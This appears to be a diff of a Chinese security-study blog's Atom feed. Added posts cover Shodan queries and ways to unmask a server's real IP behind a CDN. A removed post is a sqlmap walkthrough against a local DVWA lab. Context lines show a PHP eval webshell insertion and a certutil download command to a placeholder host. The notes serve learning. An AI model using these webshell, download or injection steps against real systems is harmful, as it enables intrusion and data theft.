@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Morn-zh.github.io</id>
     <title>Morn-zh</title>
-    <updated>2021-04-29T15:05:45.093Z</updated>
+    <updated>2021-05-09T14:58:21.122Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Morn-zh.github.io"/>
     <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
@@ -10,6 +10,251 @@
     <logo>https://Morn-zh.github.io/images/avatar.png</logo>
     <icon>https://Morn-zh.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Morn-zh</rights>
+    <entry>
+        <title type="html"><![CDATA[信息收集之shodan]]></title>
+        <id>https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-shodan/</id>
+        <link href="https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-shodan/">
+        </link>
+        <updated>2021-05-09T14:53:54.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="信息收集之shodan">信息收集之shodan</h1>
+<p>shodan音译就是撒旦，一个用来搜索在线设备的搜索引擎</p>
+<p>shodan有3个使用方式，一个是直接网页访问，一个是命令行，一个是python代码中引用</p>
+<h2 id="网页版">网页版</h2>
+<p>网址：https://www.shodan.io/</p>
+<p>现在想要搜索需要后才能使用，并且普通用户有搜索条数的限制</p>
+<h3 id="常见过滤命令">常见过滤命令</h3>
+<ul>
+<li><code>hostname</code>：搜索指定的主机或域名，例如 <code>hostname:&quot;google&quot;</code></li>
+<li><code>port</code>：搜索指定的端口或服务，例如 <code>port:&quot;21&quot;</code></li>
+<li><code>country</code>：搜索指定的国家，例如 <code>country:&quot;CN&quot;</code></li>
+<li><code>city</code>：搜索指定的城市，例如 <code>city:&quot;Hefei&quot;</code></li>
+<li><code>org</code>：搜索指定的组织或公司，例如 <code>org:&quot;google&quot;</code></li>
+<li><code>isp</code>：搜索指定的ISP供应商，例如 <code>isp:&quot;China Telecom&quot;</code></li>
+<li><code>product</code>：搜索指定的操作系统/软件/平台，例如 <code>product:&quot;Apache httpd&quot;</code></li>
+<li><code>version</code>：搜索指定的软件版本，例如 <code>version:&quot;1.6.2&quot;</code></li>
+<li><code>geo</code>：搜索指定的地理位置，参数为经纬度，例如 <code>geo:&quot;31.8639, 117.2808&quot;</code></li>
+<li><code>before/after</code>：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 <code>before:&quot;11-11-15&quot;</code></li>
+<li><code>net</code>：搜索指定的IP地址或子网，例如 <code>net:&quot;210.45.240.0/24&quot;</code></li>
+</ul>
+<h3 id="实例">实例</h3>
+<p>查找位于合肥的 Apache 服务器：</p>
+<pre><code>apache city:&quot;Hefei&quot;
+</code></pre>
+<p>查找位于国内的 Nginx 服务器：</p>
+<pre><code>nginx country:&quot;CN&quot;
+</code></pre>
+<p>查找 GWS(Google Web Server) 服务器：</p>
+<pre><code>&quot;Server: gws&quot; hostname:&quot;google&quot;
+</code></pre>
+<p>查找指定网段的华为设备：</p>
+<pre><code>huawei net:&quot;61.191.146.0/24&quot;
+</code></pre>
+<h2 id="命令行">命令行</h2>
+<p>安装</p>
+<pre><code>pip install shodan
+</code></pre>
+<p>初始化</p>
+<pre><code>shodan init [api_key]
+</code></pre>
+<p><code>api_key</code>注册后就会分配，在账户中进行查看</p>
+<h3 id="语法说明">语法说明</h3>
+<pre><code>shodan -h
+</code></pre>
+<pre><code>Usage: shodan [OPTIONS] COMMAND [ARGS]...
+
+Options:
+  -h, --help  Show this message and exit.
+
+Commands:
+  alert       Manage the network alerts for your account
+  convert     Convert the given input data file into a different format.
+  count       Returns the number of results for a search
+  data        Bulk data access to Shodan
+  domain      View all available information for a domain
+  download    Download search results and save them in a compressed JSON...
+  honeyscore  Check whether the IP is a honeypot or not.
+  host        View all available information for an IP address
+  info        Shows general information about your account
+  init        Initialize the Shodan command-line
+  myip        Print your external IP address
+  org         Manage your organization's access to Shodan
+  parse       Extract information out of compressed JSON files.
+  radar       Real-Time Map of some results as Shodan finds them.
+  scan        Scan an IP/ netblock using Shodan.
+  search      Search the Shodan database
+  stats       Provide summary information about a search query
+  stream      Stream data in real-time.
+  version     Print version of this tool.
+</code></pre>
+<h3 id="search查找">search查找</h3>
+<p>直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据</p>
+<pre><code>shodan search microsoft iis 6.0
+</code></pre>
+<pre><code>shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0
+</code></pre>
+<p>内容多的话就敲回车慢慢看，似乎有更简便的方法，但是不会（</p>
+<p>不想看了，退出按q即可</p>
+<h3 id="host信息">host信息</h3>
+<p>查找host的相关信息</p>
+<pre><code>shodan host 52.47.198.62
+</code></pre>
+<p>感觉不太准，有的端口无法被扫描出来</p>
+<h2 id="python代码">python代码</h2>
+<p>示例</p>
+<pre><code>import shodan  # 导入shodan库
+
+api = shodan.Shodan(&quot;xxxxxxxxxxx&quot;)  # 指定API_KEY,返回句柄
+try:
+    results = api.search('apache')  # 搜索apache，返回 JSON格式的数据
+    print(results)
+    print(&quot;Results found:%s&quot; % results['total'])
+    for result in results['matches']:
+        print(result['ip_str'])  # 打印出ip地址
+except shodan.APIError as e:
+    # print(&quot;Error:%s&quot; % e)
+    pass
+</code></pre>
+<p>小tips</p>
+<p>查看自身外部可见ip</p>
+<pre><code>shodan myip
+</code></pre>
+<p>查看是否为蜜罐</p>
+<pre><code>shodan honeyscore xx.xx.xx.xx
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[绕过CDN查找真实IP]]></title>
+        <id>https://Morn-zh.github.io/post/rao-guo-cdn-cha-zhao-zhen-shi-ip/</id>
+        <link href="https://Morn-zh.github.io/post/rao-guo-cdn-cha-zhao-zhen-shi-ip/">
+        </link>
+        <updated>2021-05-09T14:52:26.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="绕过cdn查找真实ip">绕过CDN查找真实IP</h1>
+<p>CDN的全称是 Content Delivery Network，即内容分发网络</p>
+<p>开启CDN后，网站会根据用户所处的位置，让用户访问邻近的CND服务器，避免直接访问主站，减少网站服务器宽带资源,降低服务器压力。</p>
+<p>所以会出现，不同地区ping百度,不同地区得到的反馈ip不一样的情形。</p>
+<p>（我可以理解是镜像吗？</p>
+<h2 id="验证是否使用cdn">验证是否使用CDN</h2>
+<h3 id="使用多地ping服务">使用多地ping服务</h3>
+<pre><code>http://ping.chinaz.com/
+http://ping.aizhan.com/
+http://ce.cloud.360.cn/
+https://www.17ce.com/
+</code></pre>
+<h3 id="使用nslookup检测">使用nslookup检测</h3>
+<p>如果返回域名解析对应多个 IP 地址多半是使用了 CDN。</p>
+<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/Snipaste_2021-05-07_21-41-45.png" alt="Snipaste_2021-05-07_21-41-45" loading="lazy"></figure>
+<h2 id="如何绕过cdn找到目标站点真实ip">如何绕过CDN找到目标站点真实IP？</h2>
+<h3 id="让服务器主动连接我们">让服务器主动连接我们</h3>
+<p>方法有</p>
+<ul>
+<li>让它发邮件给我们，我们查看邮件源代码，可以看到目标IP</li>
+<li>RSS邮件订阅（？</li>
+<li>利用网站漏洞：比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</li>
+</ul>
+<h3 id="查询dns历史记录">查询DNS历史记录</h3>
+<p>查询网站</p>
+<p>微步社区 https://x.threatbook.cn/（允许的查询次数少）</p>
+<p>ipip整合不同的地区的信息：https://tools.ipip.net/cdn.php</p>
+<p>国外的查询网站：</p>
+<p>http://toolbar.netcraft.com/site_report?url=</p>
+<p>https://viewdns.info/</p>
+<p>https://securitytrails.com/（推荐）</p>
+<h3 id="查询子域名">查询子域名</h3>
+<p>通过子站点（可能没有CDN），查询对应IP，从而辅助查找目标真实IP</p>
+<p>使用子域名扫描器、谷歌搜索都可</p>
+<h3 id="网络空间搜索引擎">网络空间搜索引擎</h3>
+<p>1、钟馗之眼：https://www.zoomeye.org/</p>
+<p>2、Shodan：https://www.shodan.io/</p>
+<p>3、FOFA：https://fofa.so/</p>
+<h3 id="通过ssl证书">通过SSL证书</h3>
+<blockquote>
+<p>摘自：https://www.hackliu.com/?p=448</p>
+</blockquote>
+<p>假如你在xyz123boot.com上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。</p>
+<blockquote>
+<p><strong>Cloudflare</strong>（<a href="https://zh.wikipedia.org/wiki/%E7%BA%BD%E7%BA%A6%E8%AF%81%E5%88%B8%E4%BA%A4%E6%98%93%E6%89%80">NYSE</a>：<a href="http://www.nyse.com/quote/XNYS:NET">NET</a>）是一家总部位于<a href="https://zh.wikipedia.org/wiki/%E8%88%8A%E9%87%91%E5%B1%B1">旧金山</a>的<a href="https://zh.wikipedia.org/wiki/%E7%BE%8E%E5%9C%8B">美国</a>跨国科技企业，以向客户提供基于<a href="https://zh.wikipedia.org/wiki/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86">反向代理</a>的<a href="https://zh.wikipedia.org/wiki/%E5%85%A7%E5%AE%B9%E5%82%B3%E9%81%9E%E7%B6%B2%E8%B7%AF">内容分发网络</a>（Content Delivery Network, CDN）及<a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F">分布式域名解析服务</a>（Distributed Domain Name Server）为主要业务。</p>
+</blockquote>
+<p>这看起来很安全，但问题是，当你在端口443（https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。</p>
+<p>此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在xyz123boot.com上的有效证书，进而获取提供给你的Web服务器IP。</p>
+<blockquote>
+<p>Censys：https://censys.io/</p>
+</blockquote>
+<p>目前Censys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。</p>
+<p>Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
+<p>而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。</p>
+<p>xyz123boot.com证书的搜索查询参数为：parsed.names：xyz123boot.com</p>
+<p>只显示有效证书的查询参数为：tags.raw：trusted</p>
+<p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
+<p>组合后的搜索参数为：parsed.names: xyz123boot.com and tags.raw: trusted</p>
+<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276469987432.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
+<p>Censys将向你显示符合上述搜索条件的所有标准证书，以上这些证书是在扫描中找到的。</p>
+<p>要逐个查看这些搜索结果，攻击者可以通过单击右侧的“Explore”，打开包含多个工具的下拉菜单。What's using this certificate? &gt; IPv4 Hosts</p>
+<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276494363607.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
+<p>此时，攻击者将看到一个使用特定证书的IPv4主机列表，而真实原始 IP就藏在其中。</p>
+<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276514702250.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
+<p>你可以通过导航到端口443上的IP来验证，看它是否重定向到xyz123boot.com，或它是否直接在IP上显示网站？</p>
+<p>使用给定的SSL证书</p>
+<p>如果你是执法部门的人员，想要找出一个隐藏在cheesecp5vaogohv.onion下的儿童色情网站。做好的办法，就是找到其原始IP，这样你就可以追踪到其托管的服务器，甚至查到背后的运营商以及金融线索。</p>
+<p>隐藏服务具有SSL证书，要查找它使用的IPv4主机，只需将&quot;SHA1 fingerprint&quot;（签名证书的sha1值）粘贴到Censys IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器。</p>
+<blockquote>
+<p>这里有个疑问，既然在网上有办法找到签名证书的sha1，也能对应到某个IP，是不是每个人都是裸奔上网？</p>
+</blockquote>
+<h3 id="检索header信息">检索header信息</h3>
+<p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p>
+<p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p>
+<p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p>
+<p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :</p>
+<p>查找由CloudFlare提供服务的网站的参数如下：</p>
+<p>80.http.get.headers.server:cloudflare</p>
+<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276536427745.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
+<h3 id="利用响应中信息">利用响应中信息</h3>
+<p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
+<p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p>
+<p>ga（'create'，'UA-93577176-1'，'auto'）;<br>
+可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p>
+<p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p>
+<p>搜索示例：https://www.shodan.io/search?query=http.html%3AUA-32023260-1</p>
+<figure data-type="image" tabindex="6"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276559939859.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
+<p>在JS⽂件中寻找敏感接⼝：</p>
+<blockquote>
+<p>https://github.com/Threezh1/JSFinder</p>
+<p>https://github.com/GerbenJavado/LinkFinder</p>
+</blockquote>
+<h3 id="使用国外主机解析域名">使用国外主机解析域名</h3>
+<p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
+<h3 id=""></h3>
+<h3 id="网站漏洞查找">网站漏洞查找</h3>
+<p>1）目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。<br>
+2）XSS盲打，命令执行反弹shell，SSRF等。<br>
+3）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
+<h3 id="用-zmap-扫全网">用 Zmap 扫全网</h3>
+<p>（未实践</p>
+<pre><code>wget http://www.ipdeny.com/ipblocks/data/countries/hk.zone #香港IP 
+zmap -w hk.zone -p 80 -B 100M -o hk.res
+./zgrab -input-file=hk.res -senders=2000 -data-&quot;./http-reg&quot; | grep -E 'memberlogin' &gt;&gt; x.txt
+</code></pre>
+<pre><code>wget -c http://ftp.apnic.net/stats/apnic/delegated-apnic-latest #全网IP,天朝好像扫不到
+</code></pre>
+<h3 id="-2"></h3>
+<h3 id="f5-ltm解码法">F5 LTM解码法</h3>
+<p>（看不懂</p>
+<p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p>
+<p>（难道是通过某种类型的cookie中暴露的信息得出IP</p>
+<p>https://www.fujieace.com/penetration-test/cdn-find-ip.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[信息收集]]></title>
+        <id>https://Morn-zh.github.io/post/xin-xi-shou-ji/</id>
+        <link href="https://Morn-zh.github.io/post/xin-xi-shou-ji/">
+        </link>
+        <updated>2021-05-06T12:47:52.000Z</updated>
+        <content type="html"><![CDATA[<p>挖坑中。。。</p>
+<h1 id="shodan">Shodan</h1>
+<h1 id="oneforall">oneforall</h1>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[phpMyAdmin随记]]></title>
         <id>https://Morn-zh.github.io/post/phpmyadmin-sui-ji/</id>
@@ -84,8 +329,7 @@ select '&lt;?php eval($_POST['a']);?&gt;'
         <link href="https://Morn-zh.github.io/post/phpinfo-zhong-zhi-de-zhu-yi-de-dian/">
         </link>
         <updated>2021-04-27T13:13:49.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="phpinfo中值得注意的点">phpinfo中值得注意的点</h1>
-<h2 id="如何获取phpinfo页面">如何获取phpinfo页面</h2>
+        <content type="html"><![CDATA[<h2 id="如何获取phpinfo页面">如何获取phpinfo页面</h2>
 <ul>
 <li>扫描器</li>
 <li>Google Hacking</li>
@@ -128,22 +372,39 @@ Copy
 <p>那么 便可以看看 php.ini 中的 disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可</p>
 <p>待看文章：</p>
 <p>php的笔记学习：https://www.kancloud.cn/a173512/php_note/1690470</p>
+<p>绕过disable_functions：https://www.meetsec.cn/（有点难啃，后续得查看下相关的资料）</p>
+<p>windows下cmd命令：https://www.jb51.net/article/141568.htm</p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[RSA加密/签名过程+SSL+面试小结]]></title>
+        <title type="html"><![CDATA[SSL+面试小结]]></title>
         <id>https://Morn-zh.github.io/post/rsa-jia-mi-qian-ming-guo-cheng/</id>
         <link href="https://Morn-zh.github.io/post/rsa-jia-mi-qian-ming-guo-cheng/">
         </link>
         <updated>2021-04-27T08:34:47.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="rsa加密签名过程">RSA加密/签名过程</h1>
-<p>面试的时候碰到这个问题，但是回答的不是很好，下来自己再总结下</p>
+        <content type="html"><![CDATA[<h1 id="ssl">SSL</h1>
+<p>安全套接层，https协议的重要组成部分<br>
+以下几篇文章配合阅读，写的比我更好、更详细</p>
+<p>SSL单向验证：https://blog.csdn.net/sarafina527/article/details/89333536?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-9&amp;spm=1001.2101.3001.4242</p>
+<p>HTTPS过程：https://www.cnblogs.com/xtiger/p/11026870.html<br>
+SSL双向验证：https://blog.csdn.net/jingzi123456789/article/details/81020747</p>
+<p>全过程图解：https://blog.csdn.net/u011779724/article/details/80776776<br>
+HTTPS篇之SSL握手过程详解：https://blog.csdn.net/kunyus/article/details/98754475?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;dist_request_id=1619765853125_25768&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control（推荐）<br>
+计网小结：https://blog.csdn.net/u010858605/article/details/113686420（推荐）</p>
+<p><strong>SSL/TLS握手方式有两种，一种基于RSA，一种基于Diffie-Hellman。</strong></p>
+<h2 id="ssl-2">SSL</h2>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/20190807155642447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2t1bnl1cw==,size_16,color_FFFFFF,t_70" alt="" loading="lazy"></figure>
+<h2 id="dh">DH</h2>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/20190807160033447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2t1bnl1cw==,size_16,color_FFFFFF,t_70" alt="" loading="lazy"></figure>
+<h1 id="https通信过程">HTTPS通信过程</h1>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/20210210085413553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTA4NTg2MDU=,size_16,color_FFFFFF,t_70" alt="" loading="lazy"></figure>
+<h1 id="rsa加密签名过程">RSA加密/签名过程</h1>
 <h2 id="加密-签名的目的">加密、签名的目的</h2>
 <p>加密的目的：保证自己发出的东西，只有收件方才能破解</p>
 <p>签名的目的：向收件方证明这东西是自己发的（以及防重放、防篡改、防抵赖、防伪造）</p>
 <p>加密、解密过程用到的算法：加密算法、解密算法<br>
 签名、验签过程用到的算法：签名算法、验签算法</p>
-<p>加密和签名是<strong>两个过程</strong>，一般配合使用</p>
+<p>加密和签名是<strong>两个过程</strong>，可以配合使用</p>
 <h2 id="加密配合签名进行消息传输的完成过程">加密配合签名进行消息传输的完成过程</h2>
 <p>前提：双方都有各自的公私钥（<strong>两套</strong>不同的公私钥组合），并且通过前期的通信拥有对方的公钥。</p>
 <p>加密/解密和签名/验签完整过程:<br>
@@ -159,14 +420,6 @@ A--&gt;B（A发送给B）</p>
 <p>图解<br>
 <img src="https://img-blog.csdnimg.cn/20200910095112326.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MjM4Nzc1,size_16,color_FFFFFF,t_70#pic_center" alt="img" loading="lazy"><br>
 图片来自：https://blog.csdn.net/m0_46238775/article/details/108507660?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-5&amp;spm=1001.2101.3001.4242</p>
-<h1 id="ssl">SSL</h1>
-<p>安全套接字，https协议的重要组成部分<br>
-以下几篇文章配合阅读，写的比我更好、更详细</p>
-<p>SSL单向验证：https://blog.csdn.net/sarafina527/article/details/89333536?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-9&amp;spm=1001.2101.3001.4242</p>
-<p>HTTPS过程：https://www.cnblogs.com/xtiger/p/11026870.html<br>
-SSL双向验证：https://blog.csdn.net/jingzi123456789/article/details/81020747</p>
-<p>全过程图解：https://blog.csdn.net/u011779724/article/details/80776776</p>
-<p>计网小结：https://blog.csdn.net/u010858605/article/details/113686420</p>
 <h1 id="面试小结">面试小结</h1>
 <p>第一次面试，面试的对象还是字节，心里还是忐忑的。<br>
 结果暂时未知，自我感觉不太好，暴露了些问题，需要去解决</p>
@@ -175,6 +428,7 @@ SSL双向验证：https://blog.csdn.net/jingzi123456789/article/details/81020747
 <li>算法丢人了，脑袋直接短路，练得还不够，加强code方面的练习--&gt;leetcode走起</li>
 <li>继续学习，不要停下来！</li>
 </ul>
+<p>复习TCP/IP：https://blog.csdn.net/qzcsu/article/details/72861891?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</p>
 ]]></content>
     </entry>
     <entry>
@@ -474,426 +728,6 @@ for /f %x in (result_bs64) do certutil.exe -urlcache -split -f http://www.yourwe
 <p>https://www.cnblogs.com/sunny11/p/14399420.html</p>
 <p>后续需要看:</p>
 <p><a href="https://www.cnblogs.com/sunny11/p/14522023.html">Getshell的姿势总结</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[sqlmap的实践与总结]]></title>
-        <id>https://Morn-zh.github.io/post/sqlmap-de-shi-jian-yu-zong-jie/</id>
-        <link href="https://Morn-zh.github.io/post/sqlmap-de-shi-jian-yu-zong-jie/">
-        </link>
-        <updated>2021-04-18T12:29:15.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="sqlmap的实践与总结">sqlmap的实践与总结</h1>
-<h2 id="本地测试">本地测试</h2>
-<h3 id="1-查看banner信息">1、查看banner信息</h3>
-<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; --banner
-</code></pre>
-<p>--cookie:指定cookie信息</p>
-<p>--banner：打印banner信息，准确的版本号</p>
-<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418191430.png" alt="QQ截图20210418191430" loading="lazy"></figure>
-<p>查看下报错注入的返回</p>
-<pre><code> http://127.0.0.1:80/DVWA/vulnerabilities/sqli/?id=1' AND EXTRACTVALUE(2972,CONCAT(0x5c,0x717a786b71,(SELECT (ELT(2972=2972,1))),0x71707a6271)) AND 'bOmG'='bOmG&amp;Submit=Submit
-</code></pre>
-<pre><code>XPATH syntax error: '\qzxkq1qpzbq'
-</code></pre>
-<p>？？？返回的是个啥？</p>
-<p>不过有手工注入的经验，知道可以注入就Ok了~</p>
-<h3 id="2-查看数据库信息">2、查看数据库信息</h3>
-<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; --dbs
-</code></pre>
-<p>--dbs：查看数据库信息</p>
-<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418191749.png" alt="QQ截图20210418191749" loading="lazy"></figure>
-<h3 id="3-查看表格">3、查看表格</h3>
-<p>可以看到很多的数据库，接下里我们就需要选择一个来进行深层次的查看</p>
-<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; --tables
-</code></pre>
-<p>-D：指定数据库</p>
-<p>--tables：查看表格信息</p>
-<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192200.png" alt="QQ截图20210418192200" loading="lazy"></figure>
-<p>显然，在dvwa数据库下有guestbook和user两张表格，接下来我们来查看表格的具体内容</p>
-<h3 id="4-查看表格的字段信息">4、查看表格的字段信息</h3>
-<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users --columns
-</code></pre>
-<p>-T：指定表格</p>
-<p>--columns：查看字段信息</p>
-<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192429.png" alt="QQ截图20210418192429" loading="lazy"></figure>
-<p>刚刚看到的就是users这张表中的数据信息，接下来看下具体的数据</p>
-<h3 id="5-查看具体数据">5、查看具体数据</h3>
-<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users --dump
-</code></pre>
-<p>--dump：导出数据</p>
-<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192718.png" alt="QQ截图20210418192718" loading="lazy"></figure>
-<h3 id="6-查看某些字段">6、查看某些字段</h3>
-<p>如果我们还想指定某些字段，可以使用-C参数</p>
-<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users -C user_id,user,password --dump
-</code></pre>
-<h2 id="参数小结">参数小结</h2>
-<p>--users：列出所有管理用户。</p>
-<p>--dbs：获取所有数据库</p>
-<p>-D：指定数据库</p>
-<p>--tables：获取所有表</p>
-<p>-T：指定表</p>
-<p>--columns：获取所有字段</p>
-<p>-C：指定字段</p>
-<p>--dump：获取表中所有数据</p>
-<p>--cookie：指定cookie信息</p>
-<p>-m：通过url列表文件依次扫描站点</p>
-<pre><code>sqlmap -m example.txt
-</code></pre>
-<p>示例文件，example.txt</p>
